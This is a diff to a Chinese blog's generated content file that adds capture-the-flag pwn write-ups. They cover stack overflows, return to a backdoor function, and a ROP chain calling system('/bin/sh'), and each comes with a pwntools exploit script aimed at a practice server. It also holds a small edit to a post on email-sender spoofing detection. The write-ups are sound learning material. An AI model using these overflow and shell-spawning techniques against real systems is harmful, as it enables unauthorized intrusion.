@@ -5679,6 +5679,50 @@
 <p>虽然这个字符串并没有调用的地方</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io  = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x4</span> + elf.sym[<span class="string">&#x27;system&#x27;</span>] + elf.sym[<span class="string">&#x27;main&#x27;</span>] + elf.sym[<span class="string">&#x27;hint&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.readline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
+
+
+
+
+<h2 id="BJDCTF-2020-babystack"><a href="#BJDCTF-2020-babystack" class="headerlink" title="[BJDCTF_2020] babystack"></a>[BJDCTF_2020] babystack</h2><p>首先checksec</p>
+<p><img src="image-20201103142341073.png" alt="image-20201103142341073"></p>
+<p>64位程序，开启了NX</p>
+<p>反编译得到main函数</p>
+<p><img src="image-20201103150115631.png" alt="image-20201103150115631"></p>
+<p>首先输入了一个数字，给到了nbytes</p>
+<p>之后用read来读入nbytes个字节到buf</p>
+<p>buf距离rbp存在0x10h</p>
+<p>另外文件中存在一个backdoor函数</p>
+<p><img src="image-20201103150253430.png" alt="image-20201103150253430"></p>
+<p>可以直接调用得到shell</p>
+<p>思路就是直接溢出0x10到rbp，然后8个字节rbp，最后覆盖返回地址到backdoor就完了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29781</span>)</span><br><span class="line"></span><br><span class="line">length = <span class="number">30</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name:\n&#x27;</span>)</span><br><span class="line">io.sendline(str(length))</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x4006e6</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;name?\n&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="jarvisoj-level2-x64"><a href="#jarvisoj-level2-x64" class="headerlink" title="jarvisoj_level2_x64"></a>jarvisoj_level2_x64</h2><p>首先checksec</p>
+<p><img src="image-20201103153919908.png" alt="image-20201103153919908"></p>
+<p>这个题目和之前的jarvisoj_level2基本是一样的思路，主要差异就在于这个是64位的</p>
+<p>因为是64位的，函数调用时不是先看栈里的数据，顺序首先是几个寄存器</p>
+<p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</p>
+<p>我们想要调用起来<code>system(&#39;/bin/sh&#39;)</code></p>
+<p>只需要这一个参数，所以需要将<code>/bin/sh</code>弹出到<code>rdi</code>中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28844</span>)</span><br><span class="line"><span class="comment">#io  = process(&#x27;./level2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level2_x64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span> + <span class="string">&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(elf.sym[<span class="string">&#x27;hint&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.readline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>首先检查安全机制</p>
+<p><img src="buuctf-pwn1/image-20201103165102208.png" alt="image-20201103165102208"></p>
+<p>运行尝试一下</p>
+<p><img src="buuctf-pwn1/image-20201103165214264.png" alt="image-20201103165214264"></p>
+<p>反编译得到main函数代码</p>
+<p><img src="buuctf-pwn1/image-20201103165340664.png" alt="image-20201103165340664"></p>
+<p>text距离rbp有20h</p>
+<p>这里的name是位于bss段的</p>
+<p><img src="buuctf-pwn1/image-20201103170309603.png" alt="image-20201103170309603"></p>
+<p>第一个read读name的时候可以读到<code>0x64</code>的长度</p>
+<p>之后gets函数是读text，这里可以溢出rbp</p>
+<p>那么思路应该就是首先在第一个输入name的时候将shellcode输入到bss段</p>
+<p>之后使用gets函数溢出rbp，跳转到bss那里执行代码</p>
 ]]></content>
       <categories>
         <category>buuctf</category>
@@ -6225,14 +6269,14 @@
     <title>邮件安全</title>
     <url>/2020/10/11/%E9%82%AE%E4%BB%B6%E5%AE%89%E5%85%A8/</url>
     <content><![CDATA[<p>参加邮件安全的数据分析比赛，这篇主要记一下期间学到的一些内容；</p>
-<a id="more"></a>
-
 <p>做的三道题目内容分别是：</p>
 <ol>
 <li>从5000封邮件中识别100封左右的伪造发件人的邮件；</li>
 <li>将24000封邮件进行分类（例如垃圾邮件、攻击邮件、钓鱼邮件等）</li>
 <li>从80w封邮件中识别出其中安全威胁最高的一些邮件（即最有可能是用来攻击的）</li>
 </ol>
+<a id="more"></a>
+
 <h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p>在一开始的资格赛里面查阅资料了解到spf，dkim,dmarc三个字段，这三个字段都是SMTP协议用于邮件的发件人检测的；</p>
 <p>所以一开始的想法就是匹配这三个字段，如果有一个不为pass就认为是伪造的，判断方法是直接读文件后对整个文本判断，结果发现判分为零</p>
 <p>之后仔细分析了提交的答案，发现有一些邮件是因为文本里面存在换行的情况，dkim被分成了dk、im等；另外有一些邮件只有spf字段，dkim、dmarc两个协议的覆盖率不是特别高。</p>
